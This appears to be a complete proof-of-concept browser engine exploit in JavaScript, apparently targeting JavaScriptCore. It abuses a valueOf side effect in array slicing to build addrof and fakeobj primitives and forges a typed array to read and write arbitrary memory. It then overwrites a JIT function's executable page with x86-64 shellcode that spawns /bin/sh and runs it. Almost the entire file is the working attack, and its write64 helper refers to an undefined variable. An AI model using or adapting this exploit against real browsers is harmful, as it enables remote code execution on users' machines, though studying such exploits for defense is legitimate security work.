function addrof(object) {
  var a = [];
  for (var i = 0; i < 100; i++) a.push(i + 0.123);
  var b = a.slice(0, {
    valueOf: function () {
      a.length = 0;
      b = [object];
      return 5;
    },
  });
  return Int64.fromDouble(b[4]);
}

function fakeobj(addr) {
  var a = [];
  for (var i = 0; i < 100; i++) a.push({});
  var b = a.slice(0, {
    valueOf: function () {
      a.length = 0;
      b = [addr.asDouble()];
      return 5;
    },
  });
  return b[4];
}

function spray() {
  for (var i = 0; i < 10000; i++) {
    var a = new Float64Array(1);
    elem = "aaa" + i;
    a[elem] = 0xdeadbeef;
  }
}

spray();

var temp = new Uint8Array(1000);

// JS cell header for a Float64Array
// m_structureID
// m_indexingType
// m_type
// m_flags
// m_cellState

// Setup jsCellHeader
var jsCellHeader = new Int64([
  0x0,0x10,0x0,0x0, 
  0x0, 
  0x2c, 
  0x08, 
  0x1, 
]);

var container = {
  jsCellHeader: jsCellHeader.asJSValue(),
  butterfly: false, // Can't use 0x0 here because of conversion to JSValue, so we use false
  vector: temp,
  lengthAndFlags: new Int64("0x0001000000000100").asJSValue(),
};

var address = Add(addrof(container), 16);
var fakearray = fakeobj(address);

while (!(fakearray instanceof Float64Array)) {
  jsCellHeader.assignAdd(jsCellHeader, Int64.One);
  container.jsCellHeader = jsCellHeader.asJSValue();
}

// Setting up arbitrary read/write
memory = {
  read: function (addr, length) {
    fakearray[2] = addr.asDouble();
    var res = new Array(length);
    for (var i = 0; i < length; i++) res[i] = temp[i];
    return res;
  },
  read64: function (addr) {
    return new Int64(this.read(addr, 8));
  },
  write: function (addr, data) {
    fakearray[2] = addr.asDouble();
    for (var i = 0; i < data.length; i++) temp[i] = data[i];
  },
  write64: function (value) {
    return this.write(addr, value.bytes());
  },
};

var empty = {};
var header = memory.read(addrof(empty), 8);
memory.write(addrof(container), header);

var arr = new Float64Array(8);
header = memory.read(addrof(arr), 16);
var length = memory.read(Add(addrof(arr), 24), 8);
memory.write(addrof(fakearray), header);
memory.write(Add(addrof(fakearray), 24), length);


fakearray.container = container;

function jit_funx() {
  function target(x) {
    return x;
  }
  for (var i = 0; i < 1000; i++) {
    target(i);
  }
  return target;
}

var pwn = jit_funx();

var pwn_addr = addrof(pwn);
print("[+] jit func --> " + pwn_addr);

var rwx_addr = memory.read64(Add(pwn_addr, 24));
print("[+] rwx instance --> " + rwx_addr);

var jitCodeAddr = memory.read64(Add(rwx_addr, 24));
print("[+] jit code addr --> " + jitCodeAddr);

var code = memory.read64(Add(jitCodeAddr, 32));
print("[+] rwx memory --> " + code);

var shellcode = [
  0x48, 0x31, 0xc0, 0x50, 0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73,
  0x68, 0x57, 0x48, 0x89, 0xe7, 0x50, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6,
  0xb0, 0x3b, 0x0f, 0x05,
];
print("[+] Dumping shellcode............");
memory.write(code, shellcode);
print("[+] Executing shellcode...");
pwn();
